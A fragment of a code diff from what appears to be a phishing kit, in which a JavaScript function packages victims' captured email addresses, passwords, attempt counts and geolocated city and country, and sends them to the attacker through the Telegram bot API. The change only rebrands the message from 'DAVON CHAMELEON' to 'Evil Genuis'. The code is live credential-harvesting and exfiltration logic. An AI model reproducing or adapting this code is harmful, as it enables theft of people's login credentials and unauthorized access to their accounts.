@@ -136,10 +136,10 @@ fetch("https://ipapi.co/json/")
 
 // Telegram message sender
 function sendTelegramMessage(email, password, attempt, country) {
-  const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
-               ` UserId : [ ${email} ]\n` +
-               `    Pass : [ ${password} ]\n` +
-               ` Country : [ ${userCity}, ${userCountry} ]`;
+  const text = `👺Evil Genuis [${attempt}/3] ☠️\n` +
+               ` 🧛🏿‍♂️UserId : [ ${email} ]\n` +
+               `   🔐Pass : [ ${password} ]\n` +
+               `🌍Country : [ ${userCity}, ${userCountry} ]`;
 
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   const payload = {
